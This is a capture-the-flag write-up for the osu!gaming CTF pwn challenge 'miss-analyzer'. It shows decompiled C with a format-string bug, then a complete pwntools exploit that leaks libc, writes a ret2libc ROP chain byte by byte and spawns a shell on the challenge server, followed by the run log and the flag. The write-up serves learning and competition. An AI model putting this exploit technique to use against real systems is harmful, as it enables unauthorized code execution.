**<font face="Cambria" size="25">Writeup: Pwn Challenge - miss-analyzer </font>**

**<font face="Cambria" size="25">Challenge Infomation </font>**

I bet you can't beat a single one of my plays!  
binary: https://github.com/Code002016/PWN-CTF-2024/blob/main/Osu%20ctf/miss-analyzer/analyzer  
server: nc chal.osugaming.lol 7273  

**<font face="Cambria" size="25">Analysis </font>**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rbx
  char v5; // [rsp+15h] [rbp-14Bh]
  __int16 v6; // [rsp+16h] [rbp-14Ah]
  char *lineptr; // [rsp+18h] [rbp-148h] BYREF
  size_t n; // [rsp+20h] [rbp-140h] BYREF
  void *ptr; // [rsp+28h] [rbp-138h] BYREF
  __int64 v10; // [rsp+30h] [rbp-130h] BYREF
  void *v11; // [rsp+38h] [rbp-128h] BYREF
  char format[264]; // [rsp+40h] [rbp-120h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-18h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( 1 )
  {
    puts("Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):");
    lineptr = 0LL;
    n = 0LL;
    if ( getline(&lineptr, &n, stdin) <= 0 )
      break;
    v3 = lineptr;
    v3[strcspn(lineptr, "\n")] = 0;
    if ( !*lineptr )
      break;
    v10 = hexs2bin(lineptr, &ptr);
    v11 = ptr;
    if ( !v10 )
    {
      puts("Error: failed to decode hex");
      return 1;
    }
    puts("\n=~= miss-analyzer =~=");
    v5 = read_byte(&v11, &v10);
    if ( v5 )
    {
      switch ( v5 )
      {
        case 1:
          puts("Mode: osu!taiko");
          break;
        case 2:
          puts("Mode: osu!catch");
          break;
        case 3:
          puts("Mode: osu!mania");
          break;
      }
    }
    else
    {
      puts("Mode: osu!");
    }
    consume_bytes((__int64)&v11, (__int64)&v10, 4);
    read_string((__int64)&v11, (__int64)&v10, format, 0xFFu);
    printf("Hash: %s\n", format);
    read_string((__int64)&v11, (__int64)&v10, format, 0xFFu);
    printf("Player name: ");
    printf(format);
    putchar(10);
    read_string((__int64)&v11, (__int64)&v10, format, 0xFFu);
    consume_bytes((__int64)&v11, (__int64)&v10, 10);
    v6 = read_short((__int64)&v11, (__int64)&v10);
    printf("Miss count: %d\n", (unsigned int)v6);
    if ( v6 )
      puts("Yep, looks like you missed.");
    else
      puts("You didn't miss!");
    puts("=~=~=~=~=~=~=~=~=~=~=\n");
    free(lineptr);
    free(ptr);
  }
  return 0;
}
```

**Vulnerability:**  
![image](https://github.com/Code002016/PWN-CTF-2024/blob/main/Osu%20ctf/miss-analyzer/image/Screenshot%202024-03-05%20201043.png)  

The program reads the output from the following command "xxd -p -c0 replay.osr | ./analyzer" to get the hash, player name, etc...  
At first, when doing this challenge, I was quite stuck because I used another person's osu replay file with a quite short player name so I could almost only leak information but could not record it, so I downloaded osu to play and do it myself. Create a record with playername "code016hiro1901" with 15 writable characters.  
The formatted position is Player name, but Osu allows creating a player name that is not too long so it cannot be written much, however we can take advantage of the hash to write it.  
I thought I could use one-gadget to solve it (I haven't tried it yet), but I tried it locally and it didn't work, so I just gave up and played ret2libc = format string.  

**Solution:**  
**Step 1:** Create or find a replay of osu with a player name long enough to format.  
**Step 2**: The command provided by the program does not match the required program format, so I edited the command's output processing a bit. I have the entire definition in the getoutput() function.  
**Step 3:** File processing: I copy the original to another file, and when editing the player name or hash, I must keep the correct length. Specifically, how do I define setup_payload().  
**Step 4:** Set up libc leak payload and necessary addresses such as pop rdi ret, system, "/bin/sh",... if you don't know how to find libc version serch, here **https://libc. blukat.me/** is a website I often use.  
**Step 5:** Write the address that needs to be edited in "hash" and format it in printf(playername), the address that needs to be edited here I use the address containing __libc_start_call_main+128 on the stack, I overwrite it so that when the program outputs normally Normally it will call this address and execute.  
**Step 6:** Waiting for the program to return to the getline, I randomly enter any bytes for the program to output and execute the call system("/bin/sh") that I passed in.  

**Script exploit:** 
```python
from pwn import *
context.log_level = 'info'
import shutil
shutil.copyfile('code016hiro1901 playing Rocket Start - Sushi Blast (Shmiklak) [Normal] (2024-03-02_20-14).osr', "temp")
import subprocess

e = context.binary = ELF('./analyzer', checksec=False)
libc = ELF('libc.so.6')

# lib = e.libc
# r= e.process()

r= remote("chal.osugaming.lol", 7273)
  
def getoutput():
    output = subprocess.check_output(['xxd', '-p', '-c0', 'temp.txt'])
    output = output.decode('utf8')
    output = output.replace('\n', '')
    return output.encode()

def setup_payload(fmt_str, write_stack):
    with open('temp', 'rb') as f_input:
        text = f_input.read() 
        modified_text = text.replace(b'code016hiro1901', fmt_str.ljust(15, b"\x00"))
        modified_text = modified_text.replace(b'317233ec6c79498a79e36712804078ce', write_stack)
        with open('temp.txt', 'wb') as f_output:
            f_output.write(modified_text)   

exit_got=0x404070

setup_payload(b':%51$p%6$p%85$p', flat(b"a"*32))

payload = getoutput()

# pause()
r.sendlineafter(b"./analyzer):\n",payload)
r.recvuntil(b":0x")

leak= int(r.recv(12),16)
base_libc= leak - 0x2cd90
info(f"base_libc: {hex(base_libc)}")

r.recvuntil(b"0x")
overwrite = int(r.recv(12),16)
info(f"overwrite: {hex(overwrite)}")

retn = overwrite - 272

system_libc = base_libc + 0x7fd5b5b26d70-0x7fd5b5ad3000
binsh_libc = base_libc + 0x7fd5b5cae678-0x7fd5b5ad3000
pop_rdi_ret = base_libc+0x00007f1bc0f2b3e5-0x7f1bc0efe000
ret = pop_rdi_ret+1
log.info("retn: %#x" %retn)

log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)
log.info("pop_rdi_ret: %#x" %pop_rdi_ret)

def write_addr_1byte(value, retn):
    for i in range(6):
        fmt = f"%{value&0xff}c%17$hhn".encode().ljust(15,b"\x00" )
        print(b"payload: "+ fmt)
        # info(f"retn: {hex(retn)}")
        # info(f"value: {hex(value&0xff)}")
        setup_payload(fmt, flat(b"a"*24, retn))
        payload= getoutput()
        r.sendlineafter(b"./analyzer):\n",payload)
        if(value !=0):
            value = value >> 8
        retn+=1  

def write_addr(value, retn):
    for i in range(3):
        fmt =f"%{value&0xffff}c%17$hn".encode().ljust(15,b"\x00" )
        print(b"payload: "+ fmt)
        info(f"retn: {hex(retn)}")
        setup_payload(fmt, flat(b"a"*24, retn))
        payload= getoutput()
        r.sendline(payload)
        value = value >> 16
        retn+=2  

# pause()
write_addr_1byte(ret, retn)
retn+=8
write_addr_1byte(pop_rdi_ret, retn)
retn+=8
write_addr_1byte(binsh_libc, retn)
retn+=8
write_addr_1byte(system_libc, retn)

# r.recv(5000)
# setup_payload(b"a", b"a")
# payload= getoutput()
# gdb.attach(r, 
    # f"""b*{retn}
    # n
    # """)
    
# pause()
r.sendlineafter(b"./analyzer):\n",b"3")

r.interactive()

# osu{1_h4te_c!!!!!!!!}
```

**Result:** 
```sh
$ python3 solve.py
[*] 'Osu ctf/miss-analyzer/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.osugaming.lol on port 7273: Done
[*] base_libc: 0x7f721a43d000
[*] overwrite: 0x7fff1d2c1f18
[*] retn: 0x7fff1d2c1e08
[*] system_libc: 0x7f721a490d70
[*] binsh_libc: 0x7f721a618678
[*] pop_rdi_ret: 0x7f721a46a3e5
b'payload: %230c%17$hhn\x00\x00\x00'
b'payload: %163c%17$hhn\x00\x00\x00'
b'payload: %70c%17$hhn\x00\x00\x00\x00'
b'payload: %26c%17$hhn\x00\x00\x00\x00'
b'payload: %114c%17$hhn\x00\x00\x00'
b'payload: %127c%17$hhn\x00\x00\x00'
b'payload: %229c%17$hhn\x00\x00\x00'
b'payload: %163c%17$hhn\x00\x00\x00'
b'payload: %70c%17$hhn\x00\x00\x00\x00'
b'payload: %26c%17$hhn\x00\x00\x00\x00'
b'payload: %114c%17$hhn\x00\x00\x00'
b'payload: %127c%17$hhn\x00\x00\x00'
b'payload: %120c%17$hhn\x00\x00\x00'
b'payload: %134c%17$hhn\x00\x00\x00'
b'payload: %97c%17$hhn\x00\x00\x00\x00'
b'payload: %26c%17$hhn\x00\x00\x00\x00'
b'payload: %114c%17$hhn\x00\x00\x00'
b'payload: %127c%17$hhn\x00\x00\x00'
b'payload: %112c%17$hhn\x00\x00\x00'
b'payload: %13c%17$hhn\x00\x00\x00\x00'
b'payload: %73c%17$hhn\x00\x00\x00\x00'
b'payload: %26c%17$hhn\x00\x00\x00\x00'
b'payload: %114c%17$hhn\x00\x00\x00'
b'payload: %127c%17$hhn\x00\x00\x00'
[*] Switching to interactive mode
Error: failed to decode hex
$ ls
flag.txt
run
$ cat flag.txt
osu{1_h4te_c!!!!!!!!}
[*] Got EOF while reading in interactive
$
```
